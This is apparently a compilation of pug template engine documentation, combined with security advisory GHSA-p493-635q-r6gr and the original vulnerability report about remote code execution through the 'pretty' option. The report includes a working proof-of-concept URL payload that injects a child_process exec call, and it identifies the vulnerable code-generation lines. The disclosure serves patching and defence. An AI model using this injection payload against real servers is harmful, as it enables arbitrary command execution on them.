## Installation

```
npm install pug-code-gen

```
## Usage

```
var generateCode = require('pug-code-gen');
```

### `generateCode(ast, options)`

Generate a JavaScript function string for the given AST.

`ast` is a fully expanded AST for Pug, with all inclusion, extends, and filters resolved.

`options` may contain the following properties that have the same meaning as the options with the same names in `pug`:

* pretty (boolean): default is `false`
* compileDebug (boolean): default is `true`
* doctype (string): default is `undefined`
* inlineRuntimeFunctions (boolean): default is `false`
* globals (array of strings): default is `[]`
* self (boolean): default is `false`

In addition to above, `pug-code-gen` has the following unique options:

* includeSources (object): map of filename to source string; used if `compileDebug` is `true`; default is `undefined`
* templateName (string): the name of the generated function; default is `'template'`

```
var lex = require('pug-lexer');
var parse = require('pug-parser');
var wrap = require('pug-runtime/wrap');
var generateCode = require('pug-code-gen');

var funcStr = generateCode(parse(lex('p Hello world!')), {
  compileDebug: false,
  pretty: true,
  inlineRuntimeFunctions: false,
  templateName: 'helloWorld'
});
//=> 'function helloWorld(locals) { ... }'

var func = wrap(funcStr, 'helloWorld');
func();
//=> '\n<p>Hello world!</p>'
```

### `new generateCode.CodeGenerator(ast, options)`

The constructor for the internal class of the code generator. You shouldn't need to use this for most purposes.

# Remote code execution via the `pretty` option.

High

[ForbesLindesay](/ForbesLindesay)
published
GHSA-p493-635q-r6gr
Feb 28, 2021

## Package

npm

pug
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<3.0.1

## Patched versions

3.0.1

## Description

### Impact

If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.

### Patches

Upgrade to `pug@3.0.1` or `pug-code-gen@3.0.2` or `pug-code-gen@2.0.3`, which correctly sanitise the parameter.

### Workarounds

If there is no way for un-trusted input to be passed to pug as the `pretty` option, e.g. if you compile templates in advance before applying user input to them, you do not need to upgrade.

| [@bramkragten](https://github.com/bramkragten)  You can just upgrade `pug-code-gen` to 2.0.3  But `pug` < 3.0.1 is labelled as a vulnerability. My security system keeps arguing that I should upgrade my `pug@^2` to `3.0.1`.  I think we should have a branch to cut a release for 2.X or **remove the vulnerability label for `pug`**. |

## Rename from "Jade"

This project was formerly known as "Jade." However, it has been revealed to us that "Jade" is a registered trademark, and as a result a rename is needed. After some discussion among the maintainers, **"Pug"** has been chosen as the new name for this project. The next major version will carry "pug" as the package name.

If your package or app currently uses `jade`, don't worry: we have secured permissions to continue to occupy that package name, although all new versions will be released under `pug`.

Before the renaming, we had already begun working on an incompatible Jade 2.0.0. We have then made it so that this new major version bump will coincide with the rename to Pug. Therefore, upgrading from Jade to Pug will be the same process as upgrading any other package with a major version bump. Currently, Pug 2.0.0 is still under beta stage, and there are several syntactic differences we have deprecated and removed. Such differences are documented at [#2305](https://github.com/pugjs/pug/issues/2305).

The website and documentation for Pug are still being updated, but if you are new to Pug, you should get started with the new syntax and install the Pug package on npm.

## Installation

### Package

via npm:

```
$ npm install pug
```

### Command Line

After installing the latest version of [Node.js](http://nodejs.org/), install with:

```
$ npm install pug-cli -g
```

and run with

```
$ pug --help
```

## Syntax

Pug is a clean, whitespace sensitive syntax for writing html. Here is a simple example:

```
doctype html
html(lang="en")
  head
    title= pageTitle
    script(type='text/javascript').
      if (foo) bar(1 + 5)
  body
    h1 Pug - node template engine
    #container.col
      if youAreUsingPug
        p You are amazing
      else
        p Get on it!
      p.
        Pug is a terse and simple templating language with a
        strong focus on performance and powerful features.
```

becomes

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Pug</title>
    <script type="text/javascript">
      if (foo) bar(1 + 5)
    </script>
  </head>
  <body>
    <h1>Pug - node template engine</h1>
    <div id="container" class="col">
      <p>You are amazing</p>
      <p>Pug is a terse and simple templating language with a strong focus on performance and powerful features.</p>
    </div>
  </body>
</html>
```

## API

For full API, see [pugjs.org/api/reference.html](https://pugjs.org/api/reference.html)

```
var pug = require('pug');

// compile
var fn = pug.compile('string of pug', options);
var html = fn(locals);

// render
var html = pug.render('string of pug', merge(options, locals));

// renderFile
var html = pug.renderFile('filename.pug', merge(options, locals));
```

### Options

* `filename` Used in exceptions, and required when using includes
* `compileDebug` When `false` no debug instrumentation is compiled
* `pretty` Add pretty-indentation whitespace to output *(false by default)*

## Browser Support

The latest version of pug can be download for the browser in standalone form from [here](https://pugjs.org/js/pug.js). It only supports the very latest browsers though, and is a large file. It is recommended that you pre-compile your pug templates to JavaScript.

To compile a template for use on the client using the command line, do:

```
$ pug --client --no-debug filename.pug
```

which will produce `filename.js` containing the compiled template.

| Hello,  I found that pug may allow an attacker to inject arbitrary javascript code if an attacker can control `options.pretty`.  **Pug Version:** 3.0.0 Proof of concept Here is an vulnerable example including 2 files: **app.js** and **index.pug**. In the example, there is only one variable "pretty" that is controlled by user, and the variable is not used in any dangerous functions.  **app.js**  ``` const express = require('express') const app = express() app.set('view engine', 'pug') app.get('/', function (req, res) {     res.render('index', { pretty: req.query.p }) }) app.listen(5000) ```  **views/index.pug**  ``` html   head   body     mixin print(text)       p= text      +print('Hello, world')  ```  But if we visit URL below, it would lead to execute OS command "whoami".  ``` http://localhost:5000/?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('  ``` Detail This section will point the location of vulnerability and explain why I assume it's an issue.  First of all, when Compiler object is initialized, `options.pretty` would be saved in `this.pp`.     [pug/packages/pug-code-gen/index.js](https://github.com/pugjs/pug/blob/06baa525a23049756de9587461d389a12bc12537/packages/pug-code-gen/index.js#L50-L56)  Lines 50 to 56 in [06baa52](/pugjs/pug/commit/06baa525a23049756de9587461d389a12bc12537)   |  | function Compiler(node, options) { | | --- | --- | |  | this.options = options = options || {}; | |  | this.node = node; | |  | this.bufferedConcatenationCount = 0; | |  | this.hasCompiledDoctype = false; | |  | this.hasCompiledTag = false; | |  | this.pp = options.pretty || false; |      The `visitMixinBlock` function is simple, `this.pp` is pushed into `this.buf` array which stores the compiled code of template without any sanitization.  **visitMixinBlock:**   [pug/packages/pug-code-gen/index.js](https://github.com/pugjs/pug/blob/06baa525a23049756de9587461d389a12bc12537/packages/pug-code-gen/index.js#L452-L459)  Lines 452 to 459 in [06baa52](/pugjs/pug/commit/06baa525a23049756de9587461d389a12bc12537)   |  | visitMixinBlock: function(block) { | | --- | --- | |  | if (this.pp) | |  | this.buf.push( | |  | "pug\_indent.push('" + Array(this.indents + 1).join(this.pp) + "');" | |  | ); | |  | this.buf.push('block && block();'); | |  | if (this.pp) this.buf.push('pug\_indent.pop();'); | |  | }, |      The `visitMixin` is basically same as `visitMixinBlock`, `this.pp` is pushed without any sanitization at line 507.  **visitMixin**:   [pug/packages/pug-code-gen/index.js](https://github.com/pugjs/pug/blob/06baa525a23049756de9587461d389a12bc12537/packages/pug-code-gen/index.js#L487-L508)  Lines 487 to 508 in [06baa52](/pugjs/pug/commit/06baa525a23049756de9587461d389a12bc12537)   |  | visitMixin: function(mixin) { | | --- | --- | |  | var name = 'pug\_mixins['; | |  | var args = mixin.args || ''; | |  | var block = mixin.block; | |  | var attrs = mixin.attrs; | |  | var attrsBlocks = this.attributeBlocks(mixin.attributeBlocks); | |  | var pp = this.pp; | |  | var dynamic = mixin.name[0] === '#'; | |  | var key = mixin.name; | |  | if (dynamic) this.dynamicMixins = true; | |  | name += | |  | (dynamic | |  | ? mixin.name.substr(2, mixin.name.length - 3) | |  | : '"' + mixin.name + '"') + ']'; | |  |  | |  | this.mixins[key] = this.mixins[key] || {used: false, instances: []}; | |  | if (mixin.call) { | |  | this.mixins[key].used = true; | |  | if (pp) | |  | this.buf.push( | |  | "pug\_indent.push('" + Array(this.indents + 1).join(pp) + "');" | |  | ); |      If we look at how other functions handle options variables, we can see that they are all sanitized by stringify.

## Bug Fixes

* Sanitise the `pretty` option ([#3314](https://github.com/pugjs/pug/pull/3314))

  If a malicious attacker could control the `pretty` option, it was possible for them to achieve remote code execution on the server rendering the template. All pug users should upgrade as soon as possible, see [#3312](https://github.com/pugjs/pug/issues/3312) for more details.
